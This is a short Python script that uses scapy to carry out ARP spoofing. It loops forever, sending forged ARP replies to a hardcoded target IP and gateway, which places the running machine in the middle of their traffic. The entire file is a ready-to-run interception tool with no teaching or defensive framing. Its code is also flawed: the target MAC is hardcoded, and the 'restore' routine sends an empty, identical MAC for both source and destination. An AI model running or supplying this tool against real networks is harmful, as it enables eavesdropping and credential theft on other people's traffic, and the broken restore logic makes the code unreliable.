#!/usr/bin/env python
import sys
import time

import scapy.all as scapy


class ARP:

    def __init__(self, mac=""):
        self.mac = mac

    def get_mac(self, ip):
        global mac
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        mac = answered_list[0][1].hwsrc
        return mac

    def spoof(self, target_ip, spoof_ip):
        # target_mac = get_mac(target_ip)
        target_mac = "54:ab:3a:81:84:89"
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    def restore(self, destination_ip, source_ip):
        destination_mac = self.mac
        source_mac = self.mac
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

    def to_arp(self, target_ip="192.168.0.101", gateway_ip="192.168.0.1"):
        try:
            sent_packets_count = 0
            while True:
                self.spoof(target_ip, gateway_ip)
                self.spoof(gateway_ip, target_ip)
                sent_packets_count = sent_packets_count + 2
                print("\r[+] Packets sent: " + str(sent_packets_count), )
                sys.stdout.flush()
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n[+] Detected CTRL+C ...... Quitting")
            self.restore(target_ip, gateway_ip)
            self.restore(gateway_ip, target_ip)


if __name__ == '__main__':
    arp = ARP()
    arp.to_arp()
